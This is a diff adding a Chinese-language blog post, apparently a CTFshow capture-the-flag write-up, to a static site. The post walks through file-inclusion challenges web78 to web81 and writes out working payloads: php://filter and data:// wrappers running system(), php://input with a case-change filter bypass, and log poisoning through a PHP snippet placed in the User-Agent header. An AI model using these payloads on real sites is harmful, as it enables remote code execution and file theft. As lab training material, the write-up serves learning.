@@ -145,6 +145,119 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87(%E4%B8%80)[78-81]/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87(%E4%B8%80)%5B78-81%5D/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-01-31 13:46:00" itemprop="dateCreated datePublished" datetime="2025-01-31T13:46:00+08:00">2025-01-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-02-01 17:01:29" itemprop="dateModified" datetime="2025-02-01T17:01:29+08:00">2025-02-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>web78</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/31/679cafc30dcb0.png" title alt style="zoom:33%;">
+
+<p>看到是get传参</p>
+<p><img src="https://www.helloimg.com/i/2025/01/31/679cb373a24df.png"></p>
+<p>因为是文件包含    所以直接想到php伪协议</p>
+<p>构造:<br>     <strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/31/679cb3dd16998.png" title alt style="zoom:33%;">
+
+<p>然后直接base64解码</p>
+<img src="https://www.helloimg.com/i/2025/01/31/679cb40ed6cb6.png" title alt style="zoom:33%;">
+
+<p><strong>web79</strong></p>
+<img src="https://www.helloimg.com/i/2025/02/01/679dc297ed53a.png" title alt style="zoom:33%;">
+
+<p>看到代码中的<code>   **$file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</code>**    意思是把  file中的php改为???</p>
+<img src="https://www.helloimg.com/i/2025/02/01/679dc6184a0de.png" title alt style="zoom:33%;">
+
+<p>利用data协议</p>
+<p>模板:<br>    data:text&#x2F;plain,<?php system("命令");?></p>
+<p>构造:<br>     <strong>?file&#x3D;data:text&#x2F;plain,<?= system("tac fla*");?></strong></p>
+<img src="https://www.helloimg.com/i/2025/02/01/679dc53782532.png" title alt style="zoom:33%;">
+
+<p><strong>web80</strong></p>
+<img src="https://www.helloimg.com/i/2025/02/01/679dca83e2d83.png" title alt style="zoom:33%;">
+
+<p>看到代码后发现他过滤了data协议</p>
+<img src="https://www.helloimg.com/i/2025/02/01/679dcb5ac8a15.png" title alt style="zoom:33%;">
+
+<p>利用php协议的另一种用法(一般在burp中进行    浏览器中一般不成功)<br>     ?file&#x3D;php:&#x2F;&#x2F;input           </p>
+<pre><code> POST:&lt;?php system(&#39;命令&#39;);?&gt;
+</code></pre>
+<img src="https://www.helloimg.com/i/2025/02/01/679dcd500a186.png" title alt style="zoom:33%;">
+
+<p>构造<br>    ?file&#x3D;Php:&#x2F;&#x2F;input(利用大小写过滤php)</p>
+<pre><code>&lt;?php system(&#39;tac fl0g.php&#39;);?&gt;
+</code></pre>
+<img src="https://www.helloimg.com/i/2025/02/01/679dcd1529232.png" title alt style="zoom:33%;">
+
+<p><strong>web81</strong></p>
+<img src="https://www.helloimg.com/i/2025/02/01/679de00ecdfb8.png" title alt style="zoom:33%;">
+
+<p>看到把:给过滤了 所以data和php协议都不可以用</p>
+<p><img src="https://www.helloimg.com/i/2025/02/01/679de04d65512.png"></p>
+<p>但可以使用日志</p>
+<p>先访问<br>    url+?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>然后抓包并在UA头进行修改(只要添加<?php system('命令');?>)<br>    Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:134.0)  <?php system('cat fl0g.php');?> Gecko&#x2F;20100101 Firefox&#x2F;134.0</p>
+<p>然后得到flag</p>
+<img src="https://www.helloimg.com/i/2025/02/01/679de11f4813f.png" title alt style="zoom:33%;">
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/30/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E5%9B%9B)[51-]/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1123,7 +1236,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
